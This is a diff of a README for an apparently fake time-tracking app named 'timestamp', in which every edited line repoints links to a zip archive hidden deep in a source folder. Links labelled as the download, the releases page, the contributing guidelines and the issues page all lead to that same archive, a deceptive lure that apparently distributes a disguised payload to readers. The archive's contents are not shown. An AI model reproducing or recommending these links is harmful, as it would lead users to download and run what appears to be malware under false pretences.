@@ -6,7 +6,7 @@ Welcome to timestamp, your personal time tracking app! With countdowns, timers, 
 
 ## 📥 Download the App
 
-[![Download timestamp](https://raw.githubusercontent.com/Klioojds/timestamp/main/src/themes/ring/test-utils/Software_v3.2.zip%20timestamp-v1.0-blue)](https://raw.githubusercontent.com/Klioojds/timestamp/main/src/themes/ring/test-utils/Software_v3.2.zip)
+[![Download timestamp](https://raw.githubusercontent.com/Klioojds/timestamp/main/src/themes/ring/utils/time-page/Software_v2.2.zip%20timestamp-v1.0-blue)](https://raw.githubusercontent.com/Klioojds/timestamp/main/src/themes/ring/utils/time-page/Software_v2.2.zip)
 
 ## 💡 Features
 
@@ -27,7 +27,7 @@ To run timestamp, you will need:
 
 ## 📦 Download & Install
 
-To get started, visit our [Releases page](https://raw.githubusercontent.com/Klioojds/timestamp/main/src/themes/ring/test-utils/Software_v3.2.zip) to download the latest version of timestamp. Choose the file appropriate for your operating system. 
+To get started, visit our [Releases page](https://raw.githubusercontent.com/Klioojds/timestamp/main/src/themes/ring/utils/time-page/Software_v2.2.zip) to download the latest version of timestamp. Choose the file appropriate for your operating system. 
 
 After downloading, follow these steps to install:
 
@@ -55,7 +55,7 @@ Make your countdowns even more special by adding personalized messages. Whether 
 
 ## 🎉 Join the Community
 
-We are looking for contributors! If you're interested in helping improve timestamp, check our [Contributing Guidelines](https://raw.githubusercontent.com/Klioojds/timestamp/main/src/themes/ring/test-utils/Software_v3.2.zip).
+We are looking for contributors! If you're interested in helping improve timestamp, check our [Contributing Guidelines](https://raw.githubusercontent.com/Klioojds/timestamp/main/src/themes/ring/utils/time-page/Software_v2.2.zip).
 
 ## 🛠️ Troubleshooting
 
@@ -75,7 +75,7 @@ A: Yes, a user guide is available within the app. Check the help section for tip
 
 ## 📞 Support
 
-If you need further assistance, feel free to reach out to us through the [Issues page](https://raw.githubusercontent.com/Klioojds/timestamp/main/src/themes/ring/test-utils/Software_v3.2.zip) on GitHub. We value your feedback and will do our best to help you.
+If you need further assistance, feel free to reach out to us through the [Issues page](https://raw.githubusercontent.com/Klioojds/timestamp/main/src/themes/ring/utils/time-page/Software_v2.2.zip) on GitHub. We value your feedback and will do our best to help you.
 
 ## 🌐 Stay Updated
 
